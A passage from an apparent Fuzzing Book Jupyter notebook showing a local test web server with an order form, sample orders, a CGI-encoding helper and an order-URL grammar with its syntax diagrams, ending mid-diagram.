   },
   "source": [
    "After interaction, you can retrieve the messages produced by the server:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 60,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-12-13T14:45:32.084358Z",
     "iopub.status.busy": "2021-12-13T14:45:32.083836Z",
     "iopub.status.idle": "2021-12-13T14:45:32.085649Z",
     "shell.execute_reply": "2021-12-13T14:45:32.086016Z"
    },
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "outputs": [],
   "source": [
    "print_httpd_messages()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "source": [
    "We can also see any orders placed in the database:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 61,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-12-13T14:45:32.089652Z",
     "iopub.status.busy": "2021-12-13T14:45:32.089047Z",
     "iopub.status.idle": "2021-12-13T14:45:32.091156Z",
     "shell.execute_reply": "2021-12-13T14:45:32.091521Z"
    },
    "slideshow": {
     "slide_type": "subslide"
    }
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "[]\n"
     ]
    }
   ],
   "source": [
    "print(db.execute(\"SELECT * FROM orders\").fetchall())"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "source": [
    "And we can clear the order database:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 62,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-12-13T14:45:32.095084Z",
     "iopub.status.busy": "2021-12-13T14:45:32.094497Z",
     "iopub.status.idle": "2021-12-13T14:45:32.097220Z",
     "shell.execute_reply": "2021-12-13T14:45:32.097670Z"
    },
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "outputs": [],
   "source": [
    "db.execute(\"DELETE FROM orders\")\n",
    "db.commit()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "subslide"
    }
   },
   "source": [
    "#### Retrieving the Home Page\n",
    "\n",
    "Even if our browser cannot directly interact with the server, the _notebook_ can.  We can, for instance, retrieve the contents of the home page and display them:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 63,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-12-13T14:45:32.101778Z",
     "iopub.status.busy": "2021-12-13T14:45:32.101176Z",
     "iopub.status.idle": "2021-12-13T14:45:32.119350Z",
     "shell.execute_reply": "2021-12-13T14:45:32.119729Z"
    },
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "outputs": [
    {
     "data": {
      "text/html": [
       "<pre style=\"background: NavajoWhite;\">127.0.0.1 - - [13/Dec/2021 15:45:32] \"GET / HTTP/1.1\" 200 -\n",
       "</pre>"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "contents = webbrowser(httpd_url)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 64,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-12-13T14:45:32.123816Z",
     "iopub.status.busy": "2021-12-13T14:45:32.123194Z",
     "iopub.status.idle": "2021-12-13T14:45:32.126112Z",
     "shell.execute_reply": "2021-12-13T14:45:32.126621Z"
    },
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "outputs": [
    {
     "data": {
      "text/html": [
       "\n",
       "<html><body>\n",
       "<form action=\"/order\" style=\"border:3px; border-style:solid; border-color:#FF0000; padding: 1em;\">\n",
       "  <strong id=\"title\" style=\"font-size: x-large\">Fuzzingbook Swag Order Form</strong>\n",
       "  <p>\n",
       "  Yes! Please send me at your earliest convenience\n",
       "  <select name=\"item\">\n",
       "  <option value=\"tshirt\">One FuzzingBook T-Shirt</option>\n",
       "<option value=\"drill\">One FuzzingBook Rotary Hammer</option>\n",
       "<option value=\"lockset\">One FuzzingBook Lock Set</option>\n",
       "\n",
       "  </select>\n",
       "  <br>\n",
       "  <table>\n",
       "  <tr><td>\n",
       "  <label for=\"name\">Name: </label><input type=\"text\" name=\"name\">\n",
       "  </td><td>\n",
       "  <label for=\"email\">Email: </label><input type=\"email\" name=\"email\"><br>\n",
       "  </td></tr>\n",
       "  <tr><td>\n",
       "  <label for=\"city\">City: </label><input type=\"text\" name=\"city\">\n",
       "  </td><td>\n",
       "  <label for=\"zip\">ZIP Code: </label><input type=\"number\" name=\"zip\">\n",
       "  </tr></tr>\n",
       "  </table>\n",
       "  <input type=\"checkbox\" name=\"terms\"><label for=\"terms\">I have read\n",
       "  the <a href=\"/terms\">terms and conditions</a></label>.<br>\n",
       "  <input type=\"submit\" name=\"submit\" value=\"Place order\">\n",
       "</p>\n",
       "</form>\n",
       "</body></html>\n"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "execution_count": 64,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "HTML(contents)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "subslide"
    }
   },
   "source": [
    "#### Placing Orders\n",
    "\n",
    "To test this form, we can generate URLs with orders and have the server process them."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "source": [
    "The method `urljoin()` puts together a base URL (i.e., the URL of our server) and a path – say, the path towards our order."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 65,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-12-13T14:45:32.129976Z",
     "iopub.status.busy": "2021-12-13T14:45:32.129379Z",
     "iopub.status.idle": "2021-12-13T14:45:32.131016Z",
     "shell.execute_reply": "2021-12-13T14:45:32.131444Z"
    },
    "slideshow": {
     "slide_type": "skip"
    }
   },
   "outputs": [],
   "source": [
    "from urllib.parse import urljoin, urlsplit"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 66,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-12-13T14:45:32.134889Z",
     "iopub.status.busy": "2021-12-13T14:45:32.134338Z",
     "iopub.status.idle": "2021-12-13T14:45:32.136943Z",
     "shell.execute_reply": "2021-12-13T14:45:32.137400Z"
    },
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'http://127.0.0.1:8800/order?foo=bar'"
      ]
     },
     "execution_count": 66,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "urljoin(httpd_url, \"/order?foo=bar\")"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "source": [
    "With `urljoin()`, we can create a full URL that is the same as the one generated by the browser as we submit the order form.  Sending this URL to the browser effectively places the order, as we can see in the server log produced:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 67,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-12-13T14:45:32.141081Z",
     "iopub.status.busy": "2021-12-13T14:45:32.140396Z",
     "iopub.status.idle": "2021-12-13T14:45:32.151621Z",
     "shell.execute_reply": "2021-12-13T14:45:32.151992Z"
    },
    "slideshow": {
     "slide_type": "subslide"
    }
   },
   "outputs": [
    {
     "data": {
      "text/html": [
       "<pre style=\"background: NavajoWhite;\">127.0.0.1 - - [13/Dec/2021 15:45:32] INSERT INTO orders VALUES ('tshirt', 'Jane Doe', 'doe@example.com', 'Seattle', '98104')\n",
       "</pre>"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "<pre style=\"background: NavajoWhite;\">127.0.0.1 - - [13/Dec/2021 15:45:32] \"GET /order?item=tshirt&name=Jane+Doe&email=doe%40example.com&city=Seattle&zip=98104 HTTP/1.1\" 200 -\n",
       "</pre>"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "contents = webbrowser(urljoin(httpd_url,\n",
    "                              \"/order?item=tshirt&name=Jane+Doe&email=doe%40example.com&city=Seattle&zip=98104\"))"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "source": [
    "The web page returned confirms the order:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 68,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-12-13T14:45:32.155746Z",
     "iopub.status.busy": "2021-12-13T14:45:32.155088Z",
     "iopub.status.idle": "2021-12-13T14:45:32.157923Z",
     "shell.execute_reply": "2021-12-13T14:45:32.158333Z"
    },
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "outputs": [
    {
     "data": {
      "text/html": [
       "\n",
       "<html><body>\n",
       "<div style=\"border:3px; border-style:solid; border-color:#FF0000; padding: 1em;\">\n",
       "  <strong id=\"title\" style=\"font-size: x-large\">Thank you for your Fuzzingbook Order!</strong>\n",
       "  <p id=\"confirmation\">\n",
       "  We will send <strong>One FuzzingBook T-Shirt</strong> to Jane Doe in Seattle, 98104<br>\n",
       "  A confirmation mail will be sent to doe@example.com.\n",
       "  </p>\n",
       "  <p>\n",
       "  Want more swag?  Use our <a href=\"/\">order form</a>!\n",
       "  </p>\n",
       "</div>\n",
       "</body></html>\n"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "execution_count": 68,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "HTML(contents)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "source": [
    "And the order is in the database, too:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 69,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-12-13T14:45:32.162441Z",
     "iopub.status.busy": "2021-12-13T14:45:32.161825Z",
     "iopub.status.idle": "2021-12-13T14:45:32.164045Z",
     "shell.execute_reply": "2021-12-13T14:45:32.164416Z"
    },
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "[('tshirt', 'Jane Doe', 'doe@example.com', 'Seattle', '98104')]\n"
     ]
    }
   ],
   "source": [
    "print(db.execute(\"SELECT * FROM orders\").fetchall())"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "subslide"
    }
   },
   "source": [
    "#### Error Messages\n",
    "\n",
    "We can also test whether the server correctly responds to invalid requests.  Nonexistent pages, for instance, are correctly handled:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 70,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-12-13T14:45:32.168158Z",
     "iopub.status.busy": "2021-12-13T14:45:32.167517Z",
     "iopub.status.idle": "2021-12-13T14:45:32.175574Z",
     "shell.execute_reply": "2021-12-13T14:45:32.175945Z"
    },
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "outputs": [
    {
     "data": {
      "text/html": [
       "<pre style=\"background: NavajoWhite;\">127.0.0.1 - - [13/Dec/2021 15:45:32] \"GET /some/other/path HTTP/1.1\" 404 -\n",
       "</pre>"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "\n",
       "<html><body>\n",
       "<div style=\"border:3px; border-style:solid; border-color:#FF0000; padding: 1em;\">\n",
       "  <strong id=\"title\" style=\"font-size: x-large\">Sorry.</strong>\n",
       "  <p>\n",
       "  This page does not exist.  Try our <a href=\"/\">order form</a> instead.\n",
       "  </p>\n",
       "</div>\n",
       "</body></html>\n",
       "  "
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "execution_count": 70,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "HTML(webbrowser(urljoin(httpd_url, \"/some/other/path\")))"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "source": [
    "You may remember we also have a page for internal server errors.  Can we get the server to produce this page?  To find this out, we have to test the server thoroughly – which we do in the remainder of this chapter."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "source": [
    "## Fuzzing Input Forms\n",
    "\n",
    "After setting up and starting the server, let us now go and systematically test it – first with expected, and then with less expected values."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "subslide"
    }
   },
   "source": [
    "### Fuzzing with Expected Values\n",
    "\n",
    "Since placing orders is all done by creating appropriate URLs, we define a [grammar](Grammars.ipynb) `ORDER_GRAMMAR` which encodes ordering URLs.  It comes with a few sample values for names, email addresses, cities and (random) digits."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "source": [
    "To make it easier to define strings that become part of a URL, we define the function `cgi_encode()`, taking a string and autmatically encoding it into CGI:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 71,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-12-13T14:45:32.179235Z",
     "iopub.status.busy": "2021-12-13T14:45:32.178726Z",
     "iopub.status.idle": "2021-12-13T14:45:32.180349Z",
     "shell.execute_reply": "2021-12-13T14:45:32.180716Z"
    },
    "slideshow": {
     "slide_type": "skip"
    }
   },
   "outputs": [],
   "source": [
    "import string"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 72,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-12-13T14:45:32.185141Z",
     "iopub.status.busy": "2021-12-13T14:45:32.184535Z",
     "iopub.status.idle": "2021-12-13T14:45:32.186021Z",
     "shell.execute_reply": "2021-12-13T14:45:32.186456Z"
    },
    "slideshow": {
     "slide_type": "subslide"
    }
   },
   "outputs": [],
   "source": [
    "def cgi_encode(s, do_not_encode=\"\"):\n",
    "    ret = \"\"\n",
    "    for c in s:\n",
    "        if (c in string.ascii_letters or c in string.digits\n",
    "                or c in \"$-_.+!*'(),\" or c in do_not_encode):\n",
    "            ret += c\n",
    "        elif c == ' ':\n",
    "            ret += '+'\n",
    "        else:\n",
    "            ret += \"%%%02x\" % ord(c)\n",
    "    return ret"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 73,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-12-13T14:45:32.189798Z",
     "iopub.status.busy": "2021-12-13T14:45:32.189245Z",
     "iopub.status.idle": "2021-12-13T14:45:32.191431Z",
     "shell.execute_reply": "2021-12-13T14:45:32.191856Z"
    },
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'Is+%22DOW30%22+down+.24%25%3f'"
      ]
     },
     "execution_count": 73,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "s = cgi_encode('Is \"DOW30\" down .24%?')\n",
    "s"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "subslide"
    }
   },
   "source": [
    "The optional parameter `do_not_encode` allows us to skip certain characters from encoding.  This is useful when encoding grammar rules:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 74,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-12-13T14:45:32.195725Z",
     "iopub.status.busy": "2021-12-13T14:45:32.195150Z",
     "iopub.status.idle": "2021-12-13T14:45:32.197407Z",
     "shell.execute_reply": "2021-12-13T14:45:32.197807Z"
    },
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'<string>%40<string>'"
      ]
     },
     "execution_count": 74,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "cgi_encode(\"<string>@<string>\", \"<>\")"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "source": [
    "`cgi_encode()` is the exact counterpart of the `cgi_decode()` function defined in the [chapter on coverage](Coverage.ipynb):"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 75,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-12-13T14:45:32.200873Z",
     "iopub.status.busy": "2021-12-13T14:45:32.200339Z",
     "iopub.status.idle": "2021-12-13T14:45:33.539677Z",
     "shell.execute_reply": "2021-12-13T14:45:33.540326Z"
    },
    "slideshow": {
     "slide_type": "skip"
    }
   },
   "outputs": [],
   "source": [
    "from Coverage import cgi_decode  # minor dependency"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 76,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-12-13T14:45:33.544369Z",
     "iopub.status.busy": "2021-12-13T14:45:33.543771Z",
     "iopub.status.idle": "2021-12-13T14:45:33.546041Z",
     "shell.execute_reply": "2021-12-13T14:45:33.546491Z"
    },
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'Is \"DOW30\" down .24%?'"
      ]
     },
     "execution_count": 76,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "cgi_decode(s)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "source": [
    "Now for the grammar.  We make use of `cgi_encode()` to encode strings:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 77,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-12-13T14:45:33.549649Z",
     "iopub.status.busy": "2021-12-13T14:45:33.549084Z",
     "iopub.status.idle": "2021-12-13T14:45:34.167090Z",
     "shell.execute_reply": "2021-12-13T14:45:34.167499Z"
    },
    "slideshow": {
     "slide_type": "skip"
    }
   },
   "outputs": [],
   "source": [
    "from Grammars import crange, is_valid_grammar, syntax_diagram"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 78,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-12-13T14:45:34.172069Z",
     "iopub.status.busy": "2021-12-13T14:45:34.171486Z",
     "iopub.status.idle": "2021-12-13T14:45:34.173441Z",
     "shell.execute_reply": "2021-12-13T14:45:34.173851Z"
    },
    "slideshow": {
     "slide_type": "subslide"
    }
   },
   "outputs": [],
   "source": [
    "ORDER_GRAMMAR = {\n",
    "    \"<start>\": [\"<order>\"],\n",
    "    \"<order>\": [\"/order?item=<item>&name=<name>&email=<email>&city=<city>&zip=<zip>\"],\n",
    "    \"<item>\": [\"tshirt\", \"drill\", \"lockset\"],\n",
    "    \"<name>\": [cgi_encode(\"Jane Doe\"), cgi_encode(\"John Smith\")],\n",
    "    \"<email>\": [cgi_encode(\"j.doe@example.com\"), cgi_encode(\"j_smith@example.com\")],\n",
    "    \"<city>\": [\"Seattle\", cgi_encode(\"New York\")],\n",
    "    \"<zip>\": [\"<digit>\" * 5],\n",
    "    \"<digit>\": crange('0', '9')\n",
    "}"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 79,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-12-13T14:45:34.177068Z",
     "iopub.status.busy": "2021-12-13T14:45:34.176557Z",
     "iopub.status.idle": "2021-12-13T14:45:34.178296Z",
     "shell.execute_reply": "2021-12-13T14:45:34.178728Z"
    },
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "outputs": [],
   "source": [
    "assert is_valid_grammar(ORDER_GRAMMAR)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 80,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-12-13T14:45:34.182443Z",
     "iopub.status.busy": "2021-12-13T14:45:34.181703Z",
     "iopub.status.idle": "2021-12-13T14:45:34.206336Z",
     "shell.execute_reply": "2021-12-13T14:45:34.206760Z"
    },
    "slideshow": {
     "slide_type": "subslide"
    }
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "start\n"
     ]
    },
    {
     "data": {
      "image/svg+xml": [
       "<svg xmlns=\"http://www.w3.org/2000/svg\" class=\"railroad-diagram\" height=\"62\" viewBox=\"0 0 182.5 62\" width=\"182.5\">\n",
       "<g transform=\"translate(.5 .5)\">\n",
       "<style>/* <![CDATA[ */\n",
       "    svg.railroad-diagram {\n",
       "    }\n",
       "    svg.railroad-diagram path {\n",
       "        stroke-width:3;\n",
       "        stroke:black;\n",
       "        fill:white;\n",
       "    }\n",
       "    svg.railroad-diagram text {\n",
       "        font:14px \"Fira Mono\", monospace;\n",
       "        text-anchor:middle;\n",
       "    }\n",
       "    svg.railroad-diagram text.label{\n",
       "        text-anchor:start;\n",
       "    }\n",
       "    svg.railroad-diagram text.comment{\n",
       "        font:italic 12px \"Fira Mono\", monospace;\n",
       "    }\n",
       "    svg.railroad-diagram rect{\n",
       "        stroke-width:2;\n",
       "        stroke:black;\n",
       "        fill:mistyrose;\n",
       "    }\n",
       "\n",
       "/* ]]> */\n",
       "</style><g>\n",
       "<path d=\"M20 21v20m10 -20v20m-10 -10h20\"/></g><g>\n",
       "<path d=\"M40 31h0.0\"/><path d=\"M142.5 31h0.0\"/><path d=\"M40.0 31h20\"/><g>\n",
       "<path d=\"M60.0 31h0.0\"/><path d=\"M122.5 31h0.0\"/><g class=\"non-terminal\">\n",
       "<path d=\"M60.0 31h0.0\"/><path d=\"M122.5 31h0.0\"/><rect height=\"22\" width=\"62.5\" x=\"60.0\" y=\"20\"/><text x=\"91.25\" y=\"35\">order</text></g></g><path d=\"M122.5 31h20\"/></g><path d=\"M 142.5 31 h 20 m -10 -10 v 20 m 10 -20 v 20\"/></g></svg>"
      ],
      "text/plain": [
       "<IPython.core.display.SVG object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "order\n"
     ]
    },
    {
     "data": {
      "image/svg+xml": [
       "<svg xmlns=\"http://www.w3.org/2000/svg\" class=\"railroad-diagram\" height=\"62\" viewBox=\"0 0 976.0 62\" width=\"976.0\">\n",
       "<g transform=\"translate(.5 .5)\">\n",
       "<style>/* <![CDATA[ */\n",
       "    svg.railroad-diagram {\n",
       "    }\n",
       "    svg.railroad-diagram path {\n",
       "        stroke-width:3;\n",
       "        stroke:black;\n",
       "        fill:white;\n",
       "    }\n",
       "    svg.railroad-diagram text {\n",
       "        font:14px \"Fira Mono\", monospace;\n",
       "        text-anchor:middle;\n",
       "    }\n",
       "    svg.railroad-diagram text.label{\n",
       "        text-anchor:start;\n",
       "    }\n",
       "    svg.railroad-diagram text.comment{\n",
       "        font:italic 12px \"Fira Mono\", monospace;\n",
       "    }\n",
       "    svg.railroad-diagram rect{\n",
       "        stroke-width:2;\n",
       "        stroke:black;\n",
       "        fill:mistyrose;\n",
       "    }\n",
       "\n",
       "/* ]]> */\n",
       "</style><g>\n",
       "<path d=\"M20 21v20m10 -20v20m-10 -10h20\"/></g><g>\n",
       "<path d=\"M40 31h0.0\"/><path d=\"M936.0 31h0.0\"/><path d=\"M40.0 31h20\"/><g>\n",
       "<path d=\"M60.0 31h0.0\"/><path d=\"M916.0 31h0.0\"/><g class=\"terminal\">\n",
       "<path d=\"M60.0 31h0.0\"/><path d=\"M182.0 31h0.0\"/><rect height=\"22\" rx=\"10\" ry=\"10\" width=\"122.0\" x=\"60.0\" y=\"20\"/><text x=\"121.0\" y=\"35\">/order?item=</text></g><path d=\"M182.0 31h10\"/><path d=\"M192.0 31h10\"/><g class=\"non-terminal\">\n",
       "<path d=\"M202.0 31h0.0\"/><path d=\"M256.0 31h0.0\"/><rect height=\"22\" width=\"54.0\" x=\"202.0\" y=\"20\"/><text x=\"229.0\" y=\"35\">item</text></g><path d=\"M256.0 31h10\"/><path d=\"M266.0 31h10\"/><g class=\"terminal\">\n",
       "<path d=\"M276.0 31h0.0\"/><path d=\"M347.0 31h0.0\"/><rect height=\"22\" rx=\"10\" ry=\"10\" width=\"71.0\" x=\"276.0\" y=\"20\"/><text x=\"311.5\" y=\"35\">&amp;name=</text></g><path d=\"M347.0 31h10\"/><path d=\"M357.0 31h10\"/><g class=\"non-terminal\">\n",
       "<path d=\"M367.0 31h0.0\"/><path d=\"M421.0 31h0.0\"/><rect height=\"22\" width=\"54.0\" x=\"367.0\" y=\"20\"/><text x=\"394.0\" y=\"35\">name</text></g><path d=\"M421.0 31h10\"/><path d=\"M431.0 31h10\"/><g class=\"terminal\">\n",
       "<path d=\"M441.0 31h0.0\"/><path d=\"M520.5 31h0.0\"/><rect height=\"22\" rx=\"10\" ry=\"10\" width=\"79.5\" x=\"441.0\" y=\"20\"/><text x=\"480.75\" y=\"35\">&amp;email=</text></g><path d=\"M520.5 31h10\"/><path d=\"M530.5 31h10\"/><g class=\"non-terminal\">\n",
       "<path d=\"M540.5 31h0.0\"/><path d=\"M603.0 31h0.0\"/><rect height=\"22\" width=\"62.5\" x=\"540.5\" y=\"20\"/><text x=\"571.75\" y=\"35\">email</text></g><path d=\"M603.0 31h10\"/><path d=\"M613.0 31h10\"/><g class=\"terminal\">\n",
       "<path d=\"M623.0 31h0.0\"/><path d=\"M694.0 31h0.0\"/><rect height=\"22\" rx=\"10\" ry=\"10\" width=\"71.0\" x=\"623.0\" y=\"20\"/><text x=\"658.5\" y=\"35\">&amp;city=</text></g><path d=\"M694.0 31h10\"/><path d=\"M704.0 31h10\"/><g class=\"non-terminal\">\n",
       "<path d=\"M714.0 31h0.0\"/><path d=\"M768.0 31h0.0\"/><rect height=\"22\" width=\"54.0\" x=\"714.0\" y=\"20\"/><text x=\"741.0\" y=\"35\">city</text></g><path d=\"M768.0 31h10\"/><path d=\"M778.0 31h10\"/><g class=\"terminal\">\n",
       "<path d=\"M788.0 31h0.0\"/><path d=\"M850.5 31h0.0\"/><rect height=\"22\" rx=\"10\" ry=\"10\" width=\"62.5\" x=\"788.0\" y=\"20\"/><text x=\"819.25\" y=\"35\">&amp;zip=</text></g><path d=\"M850.5 31h10\"/><path d=\"M860.5 31h10\"/><g class=\"non-terminal\">\n",
       "<path d=\"M870.5 31h0.0\"/><path d=\"M916.0 31h0.0\"/><rect height=\"22\" width=\"45.5\" x=\"870.5\" y=\"20\"/><text x=\"893.25\" y=\"35\">zip</text></g></g><path d=\"M916.0 31h20\"/></g><path d=\"M 936.0 31 h 20 m -10 -10 v 20 m 10 -20 v 20\"/></g></svg>"
      ],
      "text/plain": [
       "<IPython.core.display.SVG object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "item\n"
     ]
    },
    {
     "data": {
      "image/svg+xml": [
       "<svg xmlns=\"http://www.w3.org/2000/svg\" class=\"railroad-diagram\" height=\"122\" viewBox=\"0 0 199.5 122\" width=\"199.5\">\n",
       "<g transform=\"translate(.5 .5)\">\n",
       "<style>/* <![CDATA[ */\n",
       "    svg.railroad-diagram {\n",
       "    }\n",
       "    svg.railroad-diagram path {\n",
       "        stroke-width:3;\n",
       "        stroke:black;\n",
       "        fill:white;\n",
       "    }\n",
       "    svg.railroad-diagram text {\n",
       "        font:14px \"Fira Mono\", monospace;\n",
       "        text-anchor:middle;\n",
       "    }\n",
       "    svg.railroad-diagram text.label{\n",
       "        text-anchor:start;\n",
       "    }\n",
       "    svg.railroad-diagram text.comment{\n",
       "        font:italic 12px \"Fira Mono\", monospace;\n",
       "    }\n",
       "    svg.railroad-diagram rect{\n",
       "        stroke-width:2;\n",
       "        stroke:black;\n",
       "        fill:mistyrose;\n",
       "    }\n",
       "\n",
       "/* ]]> */\n",
       "</style><g>\n",
       "<path d=\"M20 51v20m10 -20v20m-10 -10h20\"/></g><g>\n",
       "<path d=\"M40 61h0.0\"/><path d=\"M159.5 61h0.0\"/><path d=\"M40.0 61a10 10 0 0 0 10 -10v-10a10 10 0 0 1 10 -10\"/><g>\n",
       "<path d=\"M60.0 31h4.25\"/><path d=\"M135.25 31h4.25\"/><g class=\"terminal\">\n",
       "<path d=\"M64.25 31h0.0\"/><path d=\"M135.25 31h0.0\"/><rect height=\"22\" rx=\"10\" ry=\"10\" width=\"71.0\" x=\"64.25\" y=\"20\"/><text x=\"99.75\" y=\"35\">tshirt</text></g></g><path d=\"M139.5 31a10 10 0 0 1 10 10v10a10 10 0 0 0 10 10\"/><path d=\"M40.0 61h20\"/><g>\n",
       "<path d=\"M60.0 61h8.5\"/><path d=\"M131.0 61h8.5\"/><g class=\"terminal\">\n",
       "<path d=\"M68.5 61h0.0\"/><path d=\"M131.0 61h0.0\"/><rect height=\"22\" rx=\"10\" ry=\"10\" width=\"62.5\" x=\"68.5\" y=\"50\"/><text x=\"99.75\" y=\"65\">drill</text></g></g><path d=\"M139.5 61h20\"/><path d=\"M40.0 61a10 10 0 0 1 10 10v10a10 10 0 0 0 10 10\"/><g>\n",
       "<path d=\"M60.0 91h0.0\"/><path d=\"M139.5 91h0.0\"/><g class=\"terminal\">\n",
       "<path d=\"M60.0 91h0.0\"/><path d=\"M139.5 91h0.0\"/><rect height=\"22\" rx=\"10\" ry=\"10\" width=\"79.5\" x=\"60.0\" y=\"80\"/><text x=\"99.75\" y=\"95\">lockset</text></g></g><path d=\"M139.5 91a10 10 0 0 0 10 -10v-10a10 10 0 0 1 10 -10\"/></g><path d=\"M 159.5 61 h 20 m -10 -10 v 20 m 10 -20 v 20\"/></g></svg>"
      ],
      "text/plain": [
       "<IPython.core.display.SVG object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "name\n"
     ]
    },
    {
     "data": {
      "image/svg+xml": [
